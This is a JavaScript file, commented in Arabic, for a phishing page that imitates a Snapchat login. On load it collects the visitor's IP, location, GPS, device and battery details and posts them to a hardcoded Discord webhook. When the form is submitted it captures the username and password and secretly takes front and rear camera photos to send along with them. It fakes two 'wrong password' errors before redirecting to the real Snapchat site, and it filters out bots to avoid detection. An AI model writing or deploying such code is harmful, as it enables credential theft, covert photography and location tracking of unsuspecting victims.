/* ==========================================================================
   ULTIMATE FIXED HUNTING ENGINE - (java.script)
   ========================================================================== */

// استبدل برابط الـ Webhook الخاص بك تماماً
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1564569407865491626/O7w6n98Q51WF2LChrTTdi2FmeUfrrzZpZp2fF5e9F7bjpPgvBnnrYI_qmG4nV5N_FXZg";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let loginAttempts = 0;

// فحص الـ Bots
function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    return ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || navigator.webdriver;
}

// جلب الـ IP والموقع عبر API موثوق
async function getIPAndLocation() {
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        return {
            ip: data.ip || "غير معروف",
            city: data.city || "غير معروف",
            region: data.region || "غير معروف",
            country: data.country_name || "غير معروف",
            org: data.org || "غير معروف"
        };
    } catch (e) {
        return { ip: "غير معروف", city: "", region: "", country: "", org: "" };
    }
}

// جلب معلومات النظام والبطارية
async function getSystemInfo() {
    const geoip = await getIPAndLocation();
    const ua = navigator.userAgent;
    const platform = navigator.platform || "غير معروف";
    const language = navigator.language || "غير معروف";
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    
    let batteryInfo = "غير مدعومة";
    try {
        if (navigator.getBattery) {
            const battery = await navigator.getBattery();
            batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'يُشحن ⚡' : 'لا يُشحن 🔋'})`;
        }
    } catch (e) {}

    return { ...geoip, ua, platform, language, screenRes, batteryInfo };
}

// دالة إرسال البيانات الموحدة للديسكورد مع معالجة الأخطاء
async function sendToDiscord(blobs, lat, lng, user = "", pass = "", status = "") {
    if (isBot()) return;

    try {
        const info = await getSystemInfo();
        const formData = new FormData();
        
        let content = `🚨 **[ تقرير صيد جديد ]**\n` +
                      `🌐 **IP:** \`${info.ip}\`\n` +
                      `🏙️ **الموقع (IP):** \`${info.country} - ${info.city} (${info.org})\`\n` +
                      `💻 **النظام:** \`${info.platform}\` | 🔋 **البطارية:** \`${info.batteryInfo}\`\n` +
                      `📐 **الشاشة:** \`${info.screenRes}\`\n`;
        
        if (lat && lng) {
            content += `📍 **GPS:** [رابط الخريطة](https://www.google.com/maps?q=${lat},${lng}) (\`${lat}, ${lng}\`)\n`;
        } else {
            content += `📍 **GPS:** لم يتم السماح به.\n`;
        }

        if (user) {
            content += `👤 **المستخدم:** \`${user}\`\n🔑 **كلمة المرور:** \`${pass}\`\n`;
        }

        if (status) {
            content += `📝 **الحالة:** ${status}\n`;
        }
        
        content += `⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`;

        if (blobs.front) formData.append('file1', blobs.front, 'front_shot.png');
        if (blobs.back) formData.append('file2', blobs.back, 'back_shot.png');

        formData.append('payload_json', JSON.stringify({
            content: content,
            username: "Hunter Bot",
            avatar_url: "https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1200px-Snapchat_logo.svg.png"
        }));

        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
    } catch (err) {
        console.error("خطأ في الإرسال:", err);
    }
}

// التقاط الصور عبر الكاميرا بشكل آمن
async function captureCamera(facingMode) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: facingMode } 
        });
        video.srcObject = stream;
        
        await new Promise(resolve => setTimeout(resolve, 1500));
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        stream.getTracks().forEach(track => track.stop());
        return blob;
    } catch (e) {
        return null;
    }
}

// التشغيل الأولي فور فتح الصفحة (سحب الـ IP والمعلومات الأساسية)
window.addEventListener('DOMContentLoaded', async () => {
    let lat = null, lng = null;
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(p => {
            lat = p.coords.latitude;
            lng = p.coords.longitude;
        }, () => {}, { timeout: 5000 });
    }
    
    // إرسال تقرير الدخول الأولي بدون إجبار الكاميرا لمنع حظر المتصفح
    await sendToDiscord({}, lat, lng, "", "", "تم فتح الصفحة وزيارة الرابط.");
});

// التفاعل مع نموذج تسجيل الدخول (apply.html) مع تطبيق شروط المحاولات والتوجيه
const loginForm = document.getElementById('fullLoginForm');
if (loginForm) {
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        loginAttempts++;

        const u = e.target.username.value;
        const p = e.target.password.value;
        
        const loadingOverlay = document.getElementById('loadingOverlay');
        if (loadingOverlay) loadingOverlay.style.display = 'flex';

        let lat = null, lng = null;
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
                lat = pos.coords.latitude;
                lng = pos.coords.longitude;
            }, () => {}, { timeout: 4000 });
        }

        // محاولة تشغيل الكاميرا وسحب الصورة عند ضغط زر تسجيل الدخول (لأنها ضغطة مستخدم فعلية وستعمل بنجاح)
        let front = await captureCamera("user");
        let back = await captureCamera("environment");

        // إرسال البيانات للديسكورد
        await sendToDiscord({ front, back }, lat, lng, u, p, `محاولة تسجيل الدخول رقم (${loginAttempts})`);

        setTimeout(() => {
            if (loadingOverlay) loadingOverlay.style.display = 'none';

            if (loginAttempts >= 3) {
                // المحاولة الثالثة: التوجيه إلى صفحة سناب شات الرسمية[span_2](start_span)[span_2](end_span)
                window.location.href = "https://accounts.snapchat.com/";
            } else {
                // المحاولة الأولى والثانية: إظهار خطأ كلمة المرور[span_3](start_span)[span_3](end_span)
                const errorMsg = document.getElementById('loginErrorMsg');
                if (errorMsg) errorMsg.style.display = 'block';
                e.target.password.value = "";
            }
        }, 1500);
    });
}
